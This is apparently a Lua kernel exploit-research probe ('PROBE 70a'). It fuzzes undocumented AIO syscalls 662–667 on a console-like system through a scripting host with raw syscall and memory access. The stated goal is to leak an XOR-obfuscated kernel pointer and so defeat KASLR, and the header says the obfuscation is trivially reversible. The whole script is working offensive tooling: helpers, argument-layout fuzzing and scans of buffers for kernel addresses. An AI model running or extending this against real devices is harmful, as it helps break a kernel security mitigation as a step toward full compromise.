-- CRASH_CLASS: LOW
-- PROBE 70a: 662 auxiliary output scan for kernel pointer leak
--
-- Context: kptr_hunt.py (13.60 static analysis) found AIO handlers 661-668
-- copy from kernel object fields [rbx+8], [rbx+0x10], [rbx+0x18] to userland.
-- Specifically, 662 has a conditional feature path (lines 591-596 of decompiled
-- sys_662.c) that copies I+0x10 — an XOR-obfuscated kernel pointer — as part
-- of a 12-byte-per-ID auxiliary output. This was never tested on 14.10.
--
-- If active: KASLR defeat without UAF. The obfuscation is (val >> 4) ^ val,
-- which is trivially reversible.
--
-- Method: submit/poll/delete cycles with different arg3 buffer sizes, pre-fill
-- patterns, and extra args. Each cycle uses fresh AIO IDs. Any write past the
-- known 4-byte-per-ID status reveals the feature path.

print("=== PROBE 70a: 662 FEATURE PATH + EXTENDED OUTPUT SCAN ===")
print("")

----------------------------------------------------------------
-- helpers
----------------------------------------------------------------
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Ignore SIGSYS/SIGPIPE
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- /dev/zero for AIO read backing
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then print("FATAL: no /dev/zero"); return end

----------------------------------------------------------------
-- AIO helpers
----------------------------------------------------------------
local COUNT = 4
local reqs   = memory.alloc(0x30)
local dbuf   = memory.alloc(0x1000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

local function submit_batch(n)
    local ids = {}
    for i = 1, n do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    return ids
end

----------------------------------------------------------------
-- output helpers
----------------------------------------------------------------
local SENTINEL = 0xCCCCCCCC

local function fill(buf, bytes)
    for off = 0, bytes - 4, 4 do wd(N(buf) + off, SENTINEL) end
end

local function write_ids(buf, ids)
    for i, id in ipairs(ids) do wd(N(buf) + (i-1)*4, id) end
end

local function scan_buf(label, buf, bytes)
    local modified = 0
    local kptrs = 0
    print("  " .. label .. ":")
    for off = 0, bytes - 4, 4 do
        local v = rd(N(buf) + off) or SENTINEL
        if v ~= SENTINEL then
            modified = modified + 1
            local tag = ""
            if off % 8 == 0 and off + 4 < bytes then
                local hi = rd(N(buf) + off + 4) or 0
                if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                    tag = " *** KPTR? ***"
                    kptrs = kptrs + 1
                end
            end
            print(string.format("    +%03X: 0x%08X%s", off, v, tag))
        end
    end
    print(string.format("    modified=%d/%d kptrs=%d", modified, math.floor(bytes/4), kptrs))
    return modified, kptrs
end

----------------------------------------------------------------
-- shared buffers
----------------------------------------------------------------
local id_buf  = memory.alloc(COUNT * 4 + 0x10)
local out_buf = memory.alloc(0x200)
local aux_buf = memory.alloc(0x200)

print("")

-- ============================================================
-- PHASE A: baseline — 662 with 4-byte states (16 bytes total)
-- ============================================================
print("[A] 662 baseline: 4 bytes/ID")
local ids = submit_batch(COUNT)
print("  submitted " .. #ids .. " IDs")
if #ids > 0 then
    write_ids(id_buf, ids)
    fill(out_buf, 0x40)
    pcall(function()
        mk(662)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)))
    end)
    scan_buf("states 4B/ID", out_buf, 0x40)
end
if not alive() then print("DEAD after A"); return end

-- ============================================================
-- PHASE B: 662 with 256-byte output buffer (64 bytes/ID)
-- Any writes past the first 16 bytes = extended output
-- ============================================================
print("")
print("[B] 662 wide buffer: 256 bytes (64B/ID)")
ids = submit_batch(COUNT)
if #ids > 0 then
    write_ids(id_buf, ids)
    fill(out_buf, 0x100)
    pcall(function()
        mk(662)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)))
    end)
    scan_buf("wide 64B/ID", out_buf, 0x100)
end
if not alive() then print("DEAD after B"); return end

-- ============================================================
-- PHASE C: 662 with 12-byte/ID output (potential aux format)
-- Pre-zero to distinguish writes from sentinel
-- ============================================================
print("")
print("[C] 662 pre-zeroed 12B/ID buffer")
ids = submit_batch(COUNT)
if #ids > 0 then
    write_ids(id_buf, ids)
    for off = 0, 0x3C, 4 do wd(N(out_buf) + off, 0) end
    -- set sentinel past the 48-byte region
    for off = 0x30, 0x5C, 4 do wd(N(out_buf) + off, SENTINEL) end
    pcall(function()
        mk(662)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)))
    end)
    print("  12B/ID region:")
    for i = 1, #ids do
        local base = (i-1) * 12
        local d0 = rd(N(out_buf) + base) or 0
        local d1 = rd(N(out_buf) + base + 4) or 0
        local d2 = rd(N(out_buf) + base + 8) or 0
        print(string.format("    ID%d: [%08X] [%08X] [%08X]", i, d0, d1, d2))
        if d1 ~= 0 or d2 ~= 0 then
            print("    ^^^ NON-ZERO AUXILIARY DATA ^^^")
        end
    end
    -- check past the expected region
    local past = rd(N(out_buf) + #ids * 12) or SENTINEL
    print(string.format("    past_region: 0x%08X (sentinel=%08X)", past, SENTINEL))
end
if not alive() then print("DEAD after C"); return end

-- ============================================================
-- PHASE D: 662 with 24-byte/ID blocks, flag patterns
-- If arg3 is input+output, the kernel reads flags from initial bytes
-- ============================================================
print("")
print("[D] 662 with 24B/ID blocks + flag patterns")
ids = submit_batch(COUNT)
if #ids > 0 then
    write_ids(id_buf, ids)
    -- Pattern: byte[0..3]=0, byte[4..7]=0x01000000, rest=0
    for off = 0, 0x17 * COUNT, 4 do wd(N(out_buf) + off, 0) end
    for i = 0, #ids - 1 do
        wd(N(out_buf) + i * 24 + 4, 0x01000000)
    end
    pcall(function()
        mk(662)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)))
    end)
    for i = 1, #ids do
        local base = (i-1) * 24
        local line = string.format("    ID%d:", i)
        for off = 0, 20, 4 do
            line = line .. string.format(" %08X", rd(N(out_buf) + base + off) or 0)
        end
        print(line)
    end
end
if not alive() then print("DEAD after D"); return end

-- ============================================================
-- PHASE E: 662 with 4th arg = aux buffer pointer
-- Maybe arg4 activates extended output written to a separate buffer
-- ============================================================
print("")
print("[E] 662 with arg4=aux_buf_ptr")
ids = submit_batch(COUNT)
if #ids > 0 then
    write_ids(id_buf, ids)
    fill(out_buf, 0x40)
    fill(aux_buf, 0x100)
    pcall(function()
        mk(662)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)),
                uint64(N(aux_buf)))
    end)
    local m1 = scan_buf("states", out_buf, 0x40)
    local m2 = scan_buf("aux_buf (arg4)", aux_buf, 0x80)
end
if not alive() then print("DEAD after E"); return end

-- ============================================================
-- PHASE F: 662 with arg4=1 (flag) and arg5=aux_buf
-- Maybe arg4 is a flag that enables extended mode
-- ============================================================
print("")
print("[F] 662 with arg4=1, arg5=aux_buf")
ids = submit_batch(COUNT)
if #ids > 0 then
    write_ids(id_buf, ids)
    fill(out_buf, 0x40)
    fill(aux_buf, 0x100)
    pcall(function()
        mk(662)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)),
                uint64(1), uint64(N(aux_buf)))
    end)
    local m1 = scan_buf("states", out_buf, 0x40)
    local m2 = scan_buf("aux_buf (arg5)", aux_buf, 0x80)
end
if not alive() then print("DEAD after F"); return end

-- ============================================================
-- PHASE G: 662 with arg4=aux_buf, arg5=size (12*count)
-- Maybe (aux_buf, size) pair triggers the copyout
-- ============================================================
print("")
print("[G] 662 with arg4=aux_buf, arg5=size")
ids = submit_batch(COUNT)
if #ids > 0 then
    write_ids(id_buf, ids)
    fill(out_buf, 0x40)
    fill(aux_buf, 0x100)
    pcall(function()
        mk(662)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)),
                uint64(N(aux_buf)), uint64(12 * #ids))
    end)
    local m1 = scan_buf("states", out_buf, 0x40)
    local m2 = scan_buf("aux_buf (arg4)", aux_buf, 0x80)
end
if not alive() then print("DEAD after G"); return end

-- ============================================================
-- PHASE H: 663 (multi_wait) with wide buffer
-- kptr_hunt: copies from [rbx+0x10]
-- ============================================================
print("")
print("[H] 663 (wait) wide buffer")
ids = submit_batch(COUNT)
if #ids > 0 then
    write_ids(id_buf, ids)
    fill(out_buf, 0x100)
    pcall(function()
        mk(663)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)))
    end)
    scan_buf("663 output", out_buf, 0x80)
    -- 663 might not delete, so clean up with 662
    fill(out_buf, 0x40)
    pcall(function()
        mk(662)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)))
    end)
end
if not alive() then print("DEAD after H"); return end

-- ============================================================
-- PHASE I: 666 (multi_cancel) with wide buffer
-- kptr_hunt: copies from [rbx+0x18]
-- ============================================================
print("")
print("[I] 666 (cancel) wide buffer")
ids = submit_batch(COUNT)
if #ids > 0 then
    write_ids(id_buf, ids)
    fill(out_buf, 0x100)
    pcall(function()
        mk(666)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)))
    end)
    scan_buf("666 output", out_buf, 0x80)
    -- clean up
    fill(out_buf, 0x40)
    pcall(function()
        mk(662)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)))
    end)
end
if not alive() then print("DEAD after I"); return end

-- ============================================================
-- PHASE J: 667 (multi_error) with wide buffer
-- 13.60: "662, 663, 664, 666, 667, 669 return −1 to six zeros"
-- With valid IDs it should work
-- ============================================================
print("")
print("[J] 667 wide buffer")
ids = submit_batch(COUNT)
if #ids > 0 then
    write_ids(id_buf, ids)
    fill(out_buf, 0x100)
    pcall(function()
        mk(667)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)))
    end)
    scan_buf("667 output", out_buf, 0x80)
    -- clean up
    fill(out_buf, 0x40)
    pcall(function()
        mk(662)(uint64(N(id_buf)), uint64(#ids), uint64(N(out_buf)))
    end)
end
if not alive() then print("DEAD after J"); return end

-- ============================================================
-- PHASE K: 665 (get_data) — single ID, output buffer
-- CAUTION: 665 kills on zeros. Use valid polled ID + buffer.
-- Try arg layouts: (id, buf), (id, buf, size), (id, 0, buf, size)
-- ============================================================
print("")
print("[K] 665 (get_data) — careful")
ids = submit_batch(1)
if #ids > 0 then
    local the_id = ids[1]
    print("  id=0x" .. string.format("%X", the_id))
    fill(out_buf, 0x100)

    -- Layout 1: 665(id, buf_ptr)
    local ret = nil
    pcall(function()
        ret = mk(665)(uint64(the_id), uint64(N(out_buf)))
    end)
    print("  layout1 (id, buf): ret=" .. (ret and fmt(ret) or "pcall_fail"))
    if alive() then
        local m, k = scan_buf("665 layout1", out_buf, 0x40)
    else
        print("  DEAD after layout1"); return
    end

    -- Layout 2: 665(id, buf_ptr, 256)
    fill(out_buf, 0x100)
    pcall(function()
        ret = mk(665)(uint64(the_id), uint64(N(out_buf)), uint64(0x100))
    end)
    print("  layout2 (id, buf, 256): ret=" .. (ret and fmt(ret) or "pcall_fail"))
    if alive() then
        scan_buf("665 layout2", out_buf, 0x40)
    else
        print("  DEAD after layout2"); return
    end

    -- Clean up
    write_ids(id_buf, ids)
    fill(out_buf, 0x10)
    pcall(function()
        mk(662)(uint64(N(id_buf)), uint64(1), uint64(N(out_buf)))
    end)
end

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print("=== 70a COMPLETE ===")
if alive() then
    print("Process ALIVE")
else
    print("Process DEAD")
end
